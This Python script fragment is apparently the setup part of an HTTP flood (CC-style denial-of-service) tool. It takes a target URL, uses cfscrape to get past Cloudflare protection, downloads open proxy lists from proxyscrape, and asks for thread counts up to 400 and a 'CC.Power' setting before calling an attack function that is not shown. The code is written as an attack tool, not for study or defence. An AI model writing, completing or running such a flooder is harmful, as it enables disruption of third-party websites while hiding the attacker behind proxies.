import cfscrape
import os
import random
import time
import requests
import threading
from colorama import Fore


def main():
    global url
    global list
    global pprr
    global thr
    global per
    url = str(input(((Fore.GREEN + 'Url : ') + Fore.WHITE)))
    ssl = str(input(((Fore.GREEN + 'Enable SSL Mode ? (y/n) : ') + Fore.WHITE)))
    ge = str(input(((Fore.GREEN + 'Get New Proxies List ? (y/n) : ') + Fore.WHITE)))
    if (ge == 'y'):
        if (ssl == 'y'):
            rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=yes&timeout=2000')
            with open('proxies.txt', 'wb') as fp:
                fp.write(rsp.content)
                print((Fore.CYAN + 'Sucess Get Https Proxies List !'))
        else:
            rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=all&timeout=1000')
            with open('proxies.txt', 'wb') as fp:
                fp.write(rsp.content)
                print((Fore.CYAN + 'Sucess Get Http Proxies List !'))
    else:
        pass
    list = str(input(((Fore.GREEN + 'List (proxies.txt) : ') + Fore.WHITE)))
    pprr = open(list).readlines()
    print((((Fore.GREEN + 'Proxies Count : ') + Fore.WHITE) + ('%d' % len(pprr))))
    thr = int(input(((Fore.GREEN + 'Threads (1-400 Default Is 300) : ') + Fore.WHITE)))
    per = int(input(((Fore.GREEN + 'CC.Power (1-100 Default Is 70) : ') + Fore.WHITE)))
    opth()
